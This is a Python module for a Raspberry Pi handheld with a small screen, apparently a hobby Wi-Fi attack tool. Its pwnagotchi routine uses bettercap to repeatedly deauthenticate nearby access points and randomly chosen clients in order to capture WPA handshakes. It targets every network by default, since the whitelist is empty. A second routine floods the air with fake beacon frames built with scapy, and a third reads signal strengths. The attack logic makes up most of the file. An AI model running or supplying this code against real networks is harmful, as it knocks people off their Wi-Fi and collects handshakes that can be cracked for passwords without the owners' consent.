import core.bettercap.bettercap as bcap
from core.SH1106.screen import *
from core.utils import *
from random import choice, randrange
from PIL import Image, ImageFont
from threading import Thread
from time import sleep
from shutil import copyfile
import socket
from random import randint
from scapy.all import RandMAC, RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, sniff, Dot11ProbeResp
from json import loads
from subprocess import getoutput

class vars:
    beaconExit = False
    framesSent = 0

class PwnagotchiScreen():
    def __init__(self, canvas, disp, image, GPIO, headerFont=ImageFont.truetype('core/fonts/roboto.ttf', 10), faceFont=ImageFont.truetype('core/fonts/hack.ttf', 18), consoleFont=ImageFont.truetype('core/fonts/roboto.ttf', 10), flipped=False) -> None:
        self.console = ""
        self.handshakes = 0
        self.aps = 0
        self.face = "(◕‿‿◕)" # dumbass face god its so cute
        #self.face = "(o..o)" # shitty face

        self.draw = canvas
        self.disp = disp
        self.image = image
        self.gpio = GPIO
        self.headerFont = headerFont
        self.faceFont = faceFont
        self.consoleFont = consoleFont
        #self.channel = 1
        self.clients = 0

        self.faces = { # 99% of these will be stolen in some way from pwnagotchi.ai
            "happy": "(◕‿‿◕)",
            "attacking": "(⌐■_■)",
            "lost": "(≖__≖)",
            "debug": "(#__#)",
            "assoc": "(°▃▃°)",
            "excited": "(☼‿‿☼)",
            "missed": "(ب__ب)",
            "searching": "(ಠ_↼ )"
        }

        self.flipped = flipped

        self.exited = False


    def updateThread(self):

        while 1:
            fullClear(self.draw)

            self.draw.rectangle([(24, 64), (24, 66)], fill=0, outline=255) # divider

            self.draw.text((2, 2), "HS: {}".format(self.handshakes), fill=0, outline=255, font=self.headerFont) # handshakes
            self.draw.text((2, 12), "APS: {}".format(self.aps), fill=0, outline=255, font=self.headerFont) # access points found
            self.draw.text((2, 22), "CLI: {}".format(self.clients), fill=0, outline=255, font=self.headerFont) # clients found

            #self.draw.text((2, 32), "CLI: {}".format(self.clients), fill=0, outline=255, font=self.headerFont) # clients found

            self.draw.text((48, 6), self.face, fill=0, outline=255, font=self.faceFont) # lil face

            self.draw.text((2, 48), self.console, fill=0, outline=255, font=self.consoleFont) # console

            if self.flipped:
                img1 = self.image.transpose(Image.FLIP_TOP_BOTTOM) # easy read
                self.disp.ShowImage(self.disp.getbuffer(img1.transpose(Image.FLIP_LEFT_RIGHT)))
            else:
                self.disp.ShowImage(self.disp.getbuffer(self.image))

            if checkIfKey(self.gpio):
                self.exited = True
                break

            sleep(0.25) # minimize writes


def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTries:int=10, checkDelay:float=float(1), nextDelay:float=float(10), fileLocation="/home/pwnagotchi/handshakes", debug:bool=False, prettyDebug:bool=True):

    screen = PwnagotchiScreen(args[0], args[1], args[2], args[3])

    Thread(target=screen.updateThread, daemon=True).start()

    oldValues = {
        "aps": 0,
        "cli": 0
    }

    deauthed = {} 

    whitelist = []

    if prettyDebug: uStatus("whitelist: {}".format(', '.join(whitelist)))

    cli = bcap.Client()

    cli.recon()
    cli.clearWifi()

    while True:
        if screen.exited: cli.run("exit"); return
        json = cli.getPairs()

        screen.aps = len(json)

        if screen.aps > oldValues["aps"]:
            screen.face = screen.faces["happy"]
        else:
            screen.face = screen.faces["lost"]

        if debug: print(json)

        screen.clients = 0

        for ap in json:
            screen.clients += len(json[ap][2]['clients'])

        for ap in json.copy():
            fullBreak = False
            pulledHandshake = False
            ssid = json[ap][0]

            screen.face = screen.faces["searching"]

            if debug: print("checking ap")

            if screen.exited:
                if debug: print("returned"); return

            if ap.lower() in whitelist:
                if debug: print("whitelist")
                if prettyDebug: uError("skipped {} due to whitelist".format(ap.lower()))
                continue

            if len(json[ap][2]['clients']) == 0:
                if debug: print("{} doesn't have clients".format(ssid))
                if prettyDebug: uError("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
                continue # empty

            while True:
                if screen.exited: cli.run("exit"); return
                targetClient = choice(json[ap][2]["clients"]) # to deauth
                pickNew = False

                if debug: print("loop")

                if targetClient[0].lower() in whitelist:
                    if debug: print("new ap due to whitelist")
                    if prettyDebug: uError("skipped {} due to whitelist (2)".format(ap.lower()))
                    fullBreak = True; break # pick new ap

                if ap in deauthed:
                    if debug: print("{} already deauthed; new ap".format(ssid))
                    if prettyDebug: uError("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
                    json.pop(ap)
                    fullBreak = True; break # pick new ap

                """
                for i in deauthed[ap]:
                    if screen.exited: cli.run("exit"); return
                    if targetClient == i:
                        #pickNew = True; break # pick new choice
                        break # dont have to pick new one
                    else:
                        break
                """

                if debug: print("chose client")
                if prettyDebug: uSuccess("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
                        
                if pickNew: continue

                break

            if fullBreak: fullBreak = False; continue # if we need to pick new ap

            screen.console = "associating w {}".format(ap)
            if prettyDebug: uStatus("associating with {} ({})".format(ap, ssid))
            screen.face = screen.faces["assoc"]
            cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc

            if debug: print(targetClient)

            screen.face = screen.faces["attacking"]
            screen.console = "deauthing {}".format(ap)
            if prettyDebug: uStatus("deauthing {} ({})".format(ap, ssid))
            for _x in range(deauthMaxTries):
                if pulledHandshake: break
                if screen.exited: cli.run("exit"); return

                for _z in range(deauthBurst):
                    if screen.exited: cli.run("exit"); return

                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(ap))
                    cli.deauth(ap, throttle=0)

                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(targetClient[0]))
                    cli.deauth(targetClient[0], throttle=0)
                    # or
                    #cli.scapyDeauth(ap, targetClient[0])
                sleep(5)

                for _y in range(checkHandshakeTries):
                    if screen.exited: cli.run("exit"); return
                    if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
                        if prettyDebug: uSuccess("got {}'s handshake ({})".format(ap, ssid))
                        screen.console = "got {}'s handshake".format(ssid)
                        screen.face = screen.faces["excited"]
                        screen.handshakes += 1

                        if ssid == "": # if ssid blank
                            fileField = ap.replace(":", "-") # some systems dont like ":"
                        else: # not blank
                            fileField = ssid

                        if debug: print("writing to {}".format(fileLocation+"/{}-{}.pcap".format(fileField, json[ap][1])))# lazy

                        deauthed[ap] = [True, targetClient]

                        sleep(nextDelay)

                        pulledHandshake = True

                        break
                    else:
                        if prettyDebug: uError("missed {}'s handshake ({})".format(ap, ssid))
                        screen.console = "missed {} handshake ({})".format(ssid, _y)
                        screen.face = screen.faces["lost"]

                    sleep(checkDelay)

            if debug: print(ssid)

            if not pulledHandshake:
                if prettyDebug: uError("completely missed {}'s handshakes ({})".format(ap, ssid))
                screen.console = "completely missed"
                screen.face = screen.faces["missed"]
            
            pulledHandshake = False

            sleep(nextDelay)

            
def pwnagotchiHTML(deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTries:int=10, checkDelay:float=float(1), nextDelay:float=float(10), fileLocation="/home/pwnagotchi/handshakes", debug:bool=False, prettyDebug:bool=True):
    """
    HTML/text version of the pwnagotchi
    uses unix sockets to communicate with main thread
    """

    windows = True

    class localVars:
        aps = 0
        clients = 0
        face = ""
        exited = False

        faces = { # 99% of these will be stolen in some way from pwnagotchi.ai
            "happy": "(◕‿‿◕)",
            "attacking": "(⌐■_■)",
            "lost": "(≖__≖)",
            "debug": "(#__#)",
            "assoc": "(°▃▃°)",
            "excited": "(☼‿‿☼)",
            "missed": "(ب__ب)",
            "searching": "(ಠ_↼ )"
        }

        console = ""
        handshakes = 0
        exitedSockRunning = False
        reporting = False # to prevent overlapping

    unixSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exitSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    unixSock.bind(("127.0.0.1", 62117))

    # wait for connection, once recieved deauth will start
    unixSock.listen(1)
    conn, addr = unixSock.accept()
    unixSock.setblocking(False)

    def uStatus(stri): # for info
        while 1:
            if localVars.reporting:
                continue
            else:
                conn.sendall(stri.encode("utf-8"))
                break

        print("[+] {}".format(stri))

    def checkExited(sock):
        try:
            localVars.exitedSockRunning = True

            print("init sock")

            sock.bind(("127.0.0.1", 62118))
            sock.listen(1)
            conn, addr = sock.accept()

            while True:
                print("sock check".format("-" * 128))
                a = sock.recv(128)
                
                if a.decode("utf-8") == "exit":
                    print("CLOSED SOCKET")
                    unixSock.close()
                    #conn.sendall("ack".encode('utf-8'))
                    localVars.exited = True
                    cli.run("exit")
                    sock.close()

                    localVars.exitedSockRunning = False
                    return
        except Exception as e:
            localVars.exitedSockRunning = str(e)
            raise e
            
    def threadReporting(sock):
        # auto reporting thread; reports info to socket
        while True:
            if localVars.exited: return

            localVars.reporting = True
            sock.sendall(str({
                "report": "true",
                "aps": str(localVars.aps),
                "clients": str(localVars.clients),
                "face": str(localVars.face),
                "console": str(localVars.console),
                "handshakes": str(localVars.handshakes)
            }).encode('utf-8'))
            sleep(0.25)
            localVars.reporting = False

            sleep(5)

    Thread(target=checkExited, args=(exitSock,)).start()

    if windows:
        #emulate
        while 1:
            uStatus("very real thing: {}".format(randint(0,255)))
            localVars.face = "({}-{})".format(randint(1,9),randint(1,9))
            sleep(randint(0,4))

            localVars.reporting = True
            conn.sendall(str({
                "report": "true",
                "aps": str(localVars.aps),
                "clients": str(localVars.clients),
                "face": str(localVars.face),
                "console": str(localVars.console),
                "handshakes": str(localVars.handshakes),
                "exited": str(localVars.exitedSockRunning)
            }).replace("'", '"').encode('utf-8'))
            sleep(0.25)
            localVars.reporting = False

    Thread(target=threadReporting, daemon=True, args=(conn,)).start()

    oldValues = {
        "aps": 0,
        "cli": 0
    }

    deauthed = {} 

    whitelist = []

    if prettyDebug: uStatus("whitelist: {}".format(', '.join(whitelist)))

    cli = bcap.Client()

    cli.recon()
    cli.clearWifi()

    while True:

        json = cli.getPairs()

        localVars.aps = len(json)

        if localVars.aps > oldValues["aps"]:
            localVars.face = localVars.faces["happy"]
        else:
            localVars.face = localVars.faces["lost"]

        if debug: print(json)

        localVars.clients = 0

        for ap in json:
            localVars.clients += len(json[ap][2]['clients'])

        for ap in json.copy():
            fullBreak = False
            pulledHandshake = False
            ssid = json[ap][0]

            localVars.face = localVars.faces["searching"]

            if debug: print("checking ap")



            if ap.lower() in whitelist:
                if debug: print("whitelist")
                if prettyDebug: uStatus("skipped {} due to whitelist".format(ap.lower()))
                continue

            if len(json[ap][2]['clients']) == 0:
                if debug: print("{} doesn't have clients".format(ssid))
                if prettyDebug: uStatus("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
                continue # empty

            while True:
    
                targetClient = choice(json[ap][2]["clients"]) # to deauth
                pickNew = False

                if debug: print("loop")

                if targetClient[0].lower() in whitelist:
                    if debug: print("new ap due to whitelist")
                    if prettyDebug: uStatus("skipped {} due to whitelist (2)".format(ap.lower()))
                    fullBreak = True; break # pick new ap

                if ap in deauthed:
                    if debug: print("{} already deauthed; new ap".format(ssid))
                    if prettyDebug: uStatus("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
                    json.pop(ap)
                    fullBreak = True; break # pick new ap

                """
                for i in deauthed[ap]:
        
                    if targetClient == i:
                        #pickNew = True; break # pick new choice
                        break # dont have to pick new one
                    else:
                        break
                """

                if debug: print("chose client")
                if prettyDebug: uStatus("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
                        
                if pickNew: continue

                break

            if fullBreak: fullBreak = False; continue # if we need to pick new ap

            localVars.console = "associating w {}".format(ap)
            if prettyDebug: uStatus("associating with {} ({})".format(ap, ssid))
            localVars.face = localVars.faces["assoc"]
            cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc

            if debug: print(targetClient)

            localVars.face = localVars.faces["attacking"]
            localVars.console = "deauthing {}".format(ap)
            if prettyDebug: uStatus("deauthing {} ({})".format(ap, ssid))
            for _x in range(deauthMaxTries):
                if pulledHandshake: break
    

                for _z in range(deauthBurst):
        

                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(ap))
                    cli.deauth(ap, throttle=0)

                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(targetClient[0]))
                    cli.deauth(targetClient[0], throttle=0)
                    # or
                    #cli.scapyDeauth(ap, targetClient[0])
                sleep(5)

                for _y in range(checkHandshakeTries):
        
                    if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
                        if prettyDebug: uStatus("got {}'s handshake ({})".format(ap, ssid))
                        localVars.console = "got {}'s handshake".format(ssid)
                        localVars.face = localVars.faces["excited"]
                        localVars.handshakes += 1

                        if ssid == "": # if ssid blank
                            fileField = ap.replace(":", "-") # some systems dont like ":"
                        else: # not blank
                            fileField = ssid

                        if debug: print("writing to {}".format(fileLocation+"/{}-{}.pcap".format(fileField, json[ap][1])))# lazy

                        deauthed[ap] = [True, targetClient]

                        sleep(nextDelay)

                        pulledHandshake = True

                        break
                    else:
                        if prettyDebug: uStatus("missed {}'s handshake ({})".format(ap, ssid))
                        localVars.console = "missed {} handshake ({})".format(ssid, _y)
                        localVars.face = localVars.faces["lost"]

                    sleep(checkDelay)

            if debug: print(ssid)

            if not pulledHandshake:
                if prettyDebug: uStatus("completely missed {}'s handshakes ({})".format(ap, ssid))
                localVars.console = "completely missed"
                localVars.face = localVars.faces["missed"]
            
            pulledHandshake = False

            sleep(nextDelay)

def beaconSpam(args:list):
    #enterText(args[0], args[1], args[2], args[3])
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    def probeBeaconThread(ssid, mac=RandMAC()):
        frame = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        while True:
            if vars.beaconExit: break

            if checkIfKey(GPIO): break

            sendp(frame, iface=iface, verbose=0)
            vars.framesSent += 1

            sleep(0.1)

    with open("./core/aps2spam", "r") as f:
        ssids = f.read().split("\n")
        print(ssids)

    handler = screenConsole(draw,disp,image) # init handler
    Thread(target=handler.start,daemon=True).start() # start handler

    #handler.setPercentage(0)

    #ssidFrames = {}
    threads1 = []

    iface = loads(open("./config.json").read())["monitorInterface"]

    handler.text = "iface: {}".format(iface)

    for ssid in ssids:
        if [x for x in ssid][0] == "#": continue
        multiple=False

        # create frames for all ssids
        #mac = RandMAC()

        if "?$?" in ssid:
            try:
                multiple = int(ssid.split("?$?")[-1])
            except:
                continue

        if multiple == False:
            #ssidFrames[ssid] = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            threads1.append(Thread(target=probeBeaconThread, args=(ssid,), daemon=True))
        else:
            for x in range(multiple):
                #ssidFrames[ssid] = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid+str(x), len=len(ssid))
                threads1.append(Thread(target=probeBeaconThread, args=(ssid+str(x),), daemon=True))

    while checkIfKey(GPIO): sleep(0.1)

    for x in threads1:
        x.start()
        sleep(0.1) # just so they dont access interface at the same time

    while True:
        if checkIfKey(GPIO): break

        handler.text = "frames: {}\n\npress any key\nto stop".format(vars.framesSent)
        
        sleep(0.25)

    vars.beaconExit = True
    handler.text = "shutting threads.."

    for x in threads1:
        x.join()

    handler.exit()

    sleep(0.5)

def rssiReader(args:list):
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    flipped =False

    class abVars:
        stri = []
        json = {}
        exited = False

    #handler = screenConsole(draw,disp,image, autoUpdate=False) # init handler
    #Thread(target=handler.start,daemon=True).start() # start handler

    #menuHandler = AsyncMenu(draw,disp,image,GPIO, choices=stri) # init handler
    #Thread(target=menuHandler.menu,daemon=True, kwargs={"flipperZeroMenu": False,}).start() # start handler

    #handler.update()

    iface = loads(open("./config.json").read())["monitorInterface"]
    font = ImageFont.truetype('core/fonts/roboto.ttf', 10)

    try:
        cli = bcap.Client(iface=iface)
    except Exception as e:
        draw.text([2,2], "failed to init bettercap:\n{}\n\nwaiting on your key...".format(str(e)))
        disp.ShowImage(disp.getbuffer(image))
        waitForKey(GPIO)
        return

    cli.recon()
    cli.clearWifi()

    gpioPins={'KEY_UP_PIN': 6,'KEY_DOWN_PIN': 19,'KEY_LEFT_PIN': 5,'KEY_RIGHT_PIN': 26,'KEY_PRESS_PIN': 13,'KEY1_PIN': 21,'KEY2_PIN': 20,'KEY3_PIN': 16,}

    loading = "."

    ch = 0
    cz = 0

    while True:

        while True:
            fullClear(draw)

            abVars.json = cli.getPairs()
            #print(abVars.json)

            for bssid in abVars.json:

                if bssid in abVars.stri:
                    continue
                else:
                    abVars.stri.append(bssid)

            for i in abVars.stri.copy():
                if i in list(abVars.json):
                    pass
                else:
                    abVars.stri.remove(i)

            if len(abVars.stri) != 0:
                break

            draw.text((3, 16), loading, fill=0, outline=255, font=None)
            loading += "."

            if len(loading) == 24: loading = "."

            if flipped:
                disp.ShowImage(disp.getbuffer(image.transpose(Image.FLIP_LEFT_RIGHT)))
            else:
                disp.ShowImage(disp.getbuffer(image))

            sleep(1)

    

        draw.rectangle([(0, 0), (200, 14)], fill=0, outline=255)

        draw.text((3, 1), ''.join([str(x) for x in abVars.json[abVars.stri[ch]][0][:16]]), fill=1, outline=255, font=None)
        draw.text((100, 1), "{}/{}".format(abVars.stri.index(abVars.stri[ch]), len(abVars.stri) - 1), fill=1, outline=255, font=font)

        compiledJson = []

        for x in abVars.json[abVars.stri[ch]][2]:
            value = abVars.json[abVars.stri[ch]][2][x]
            if type(value) == list:
                value = len(value)

            if type(value) == str:
                if len(value) > 25:
                    value = '\n' + value

            compiledJson.append("{}: {}".format(x, value))

        for x in range(cz):
            if len(compiledJson) == 1: break
            compiledJson.pop(0)

        # TODO: finish this; scroll left and right
        draw.text((3, 16), '\n'.join(compiledJson), fill=0, outline=255, font=font)

        # show compiled image
        if flipped:
            disp.ShowImage(disp.getbuffer(image.transpose(Image.FLIP_LEFT_RIGHT)))
        else:
            disp.ShowImage(disp.getbuffer(image))

        while True:
            key = getKey(GPIO)
            if key == gpioPins["KEY_RIGHT_PIN"]:
                if ch != len(abVars.stri) - 1:
                    ch += 1
                break
            elif key == gpioPins["KEY_LEFT_PIN"]:
                if ch != 0:
                    ch -= 1
                break
            elif key == gpioPins["KEY_UP_PIN"]:
                if cz != 0:
                    cz -= 1
                break
            elif key == gpioPins["KEY_DOWN_PIN"]:
                if cz != len(compiledJson) - 1:
                    cz += 1
                break

            elif key == gpioPins["KEY3_PIN"]:
                #print(cli.run("exit"))
                cli.stop()
                return




def functions():
    """
    put your executable functions here and your configuration
    """
    return {
        "marauder": {
            "pwnagotchi": "dfhuigosaio9by tdfhudfhudfhudfhudfhurdfhuedfhusdfhuodfhudfhudfhudfhudfhudfhudfhudfhudfhudfhudofhudfhuodfhuodofhudfhu",
            "beaconSpam": "spam beacons",
            "rssiReader": "read rssi beacons"
        },
        
        "icons":{
            "marauder": "./core/icons/wififolder.bmp",
            "pwnagotchi": "./core/icons/wifi.bmp",
            "beaconSpam": "./core/icons/routeremit.bmp",
        }
    }